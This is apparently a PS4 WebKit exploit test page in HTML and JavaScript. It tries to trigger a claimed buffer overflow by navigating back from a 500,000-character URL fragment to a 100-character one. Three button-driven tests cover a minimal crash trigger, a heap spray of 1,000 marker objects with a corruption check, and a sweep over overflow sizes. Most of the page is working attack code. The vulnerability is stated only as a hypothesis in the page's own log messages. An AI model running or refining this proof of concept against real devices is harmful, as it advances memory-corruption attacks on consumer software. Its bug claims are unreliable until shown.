<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit ‚Äì Fragment Size Mismatch Overflow</title>

</head>
<body>
<h2>üéØ PS4 WebKit ‚Äì Fragment Size Mismatch Exploit</h2>
<h3>Bug: Buffer overflow during back() navigation with mismatched fragment sizes</h3>

<button onclick="runMinimalCrash()">TEST 1 ‚Äì Minimal crash (2 entries only)</button>
<button onclick="runSprayCorruption()">TEST 2 ‚Äì Spray corruption detection</button>
<button onclick="runControlledOverflow()">TEST 3 ‚Äì Controlled overflow size</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m, cls=""){ 
  const span = document.createElement("span");
  if(cls) span.className = cls;
  span.textContent = m + "\n";
  logEl.appendChild(span);
}
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

let spray = [];
let popstateCount = 0;

window.addEventListener("popstate", (e) => {
  popstateCount++;
  const hashLen = location.hash.length;
  const stateStr = e.state ? JSON.stringify(e.state).slice(0,60) : "null";
  log(`[POPSTATE #${popstateCount}] hash.length=${hashLen}, state=${stateStr}`, "success");
});

// -------------------------------------------------
// TEST 1 ‚Äì Absolute minimal crash case
// -------------------------------------------------
async function runMinimalCrash(){
  logEl.textContent = "";
  popstateCount = 0;
  
  log("=== TEST 1 ‚Äì MINIMAL CRASH ===", "critical");
  log("Hypothesis: back() from large‚Üísmall fragment causes overflow\n");
  
  log("[STEP 1] Create small fragment entry (100 bytes)");
  history.pushState({id: 0, size: 100}, "", "#"+"A".repeat(100));
  await sleep(50);
  
  log("[STEP 2] Create LARGE fragment entry (500,000 bytes)", "warn");
  history.pushState({id: 1, size: 500000}, "", "#"+"B".repeat(500000));
  await sleep(50);
  
  log("\n[TRIGGER] Executing back() from large ‚Üí small", "critical");
  log("Expected: Crash due to buffer overflow");
  log("Buffer allocated for 100 bytes, receives 500,000 bytes\n");
  
  await sleep(100);
  history.back();
  await sleep(500);
  
  log("=== TEST 1 END (should not reach) ===");
}

// -------------------------------------------------
// TEST 2 ‚Äì Spray and detect corruption
// -------------------------------------------------
async function runSprayCorruption(){
  logEl.textContent = "";
  popstateCount = 0;
  spray = [];
  
  log("=== TEST 2 ‚Äì SPRAY CORRUPTION ===", "critical");
  log("Strategy: Spray objects, trigger overflow, detect corruption\n");
  
  log("[STEP 1] Create small fragment entry");
  history.pushState({id: 0}, "", "#"+"S".repeat(100));
  await sleep(50);
  
  log("[STEP 2] Spray 1000 objects with unique markers");
  const MARKER_PREFIX = "CORRUPT_CHECK_";
  for(let i=0; i<1000; i++){
    spray.push({
      id: i,
      marker: MARKER_PREFIX + i.toString(16).padStart(8, "0"),
      padding: new Array(100).fill(i)
    });
  }
  log(`  Sprayed ${spray.length} objects`);
  await sleep(100);
  
  log("\n[STEP 3] Create LARGE fragment entry", "warn");
  history.pushState({id: 1}, "", "#"+"L".repeat(400000));
  await sleep(50);
  
  log("\n[STEP 4] Check spray integrity BEFORE trigger");
  let corruptedBefore = checkSprayIntegrity(MARKER_PREFIX);
  log(`  Corrupted before: ${corruptedBefore}/${spray.length}`, 
      corruptedBefore > 0 ? "critical" : "success");
  
  log("\n[TRIGGER] back() from large ‚Üí small", "critical");
  await sleep(100);
  history.back();
  await sleep(200);
  
  log("\n[STEP 5] Check spray integrity AFTER trigger");
  let corruptedAfter = checkSprayIntegrity(MARKER_PREFIX);
  log(`  Corrupted after: ${corruptedAfter}/${spray.length}`, 
      corruptedAfter > 0 ? "critical" : "success");
  
  if(corruptedAfter > corruptedBefore){
    log(`\nüö® CORRUPTION CONFIRMED: ${corruptedAfter - corruptedBefore} new corruptions`, "critical");
    
    // Show first few corruptions
    for(let i=0; i<spray.length && i<10; i++){
      if(spray[i].marker !== MARKER_PREFIX + i.toString(16).padStart(8, "0")){
        log(`  Object ${i}: marker="${spray[i].marker}"`, "critical");
      }
    }
  }
  
  log("\n=== TEST 2 END ===");
}

function checkSprayIntegrity(prefix){
  let corrupted = 0;
  for(let i=0; i<spray.length; i++){
    const expected = prefix + i.toString(16).padStart(8, "0");
    if(spray[i].marker !== expected){
      corrupted++;
    }
  }
  return corrupted;
}

// -------------------------------------------------
// TEST 3 ‚Äì Controlled overflow size
// -------------------------------------------------
async function runControlledOverflow(){
  logEl.textContent = "";
  popstateCount = 0;
  
  log("=== TEST 3 ‚Äì CONTROLLED OVERFLOW SIZE ===", "critical");
  log("Strategy: Binary search for minimum overflow size\n");
  
  const testSizes = [
    { small: 100, large: 100000 },   // 1000x
    { small: 100, large: 50000 },    // 500x
    { small: 100, large: 10000 },    // 100x
    { small: 100, large: 1000 },     // 10x
    { small: 100, large: 500 }       // 5x
  ];
  
  for(const test of testSizes){
    log(`\n[TEST] Small: ${test.small}, Large: ${test.large} (${(test.large/test.small).toFixed(0)}x ratio)`, "warn");
    
    // Clear history
    while(history.length > 1){
      history.back();
      await sleep(5);
    }
    
    log("  Creating entries...");
    history.pushState({size: test.small}, "", "#"+"X".repeat(test.small));
    await sleep(30);
    history.pushState({size: test.large}, "", "#"+"Y".repeat(test.large));
    await sleep(30);
    
    log("  Triggering back()...", "critical");
    popstateCount = 0;
    history.back();
    await sleep(150);
    
    if(popstateCount > 0){
      log(`  ‚úì Survived (popstate received)`, "success");
    } else {
      log(`  ‚ùå Likely crashed (no popstate)`, "critical");
      break;
    }
  }
  
  log("\n=== TEST 3 END ===");
}

log("Ready. Tests ordered by diagnostic value:");
log("1. Minimal crash - confirms bug with 2 entries only");
log("2. Spray corruption - detects heap corruption");
log("3. Controlled overflow - finds minimum trigger size");
log("\nSTART WITH TEST 1");
</script>
</body>
</html>
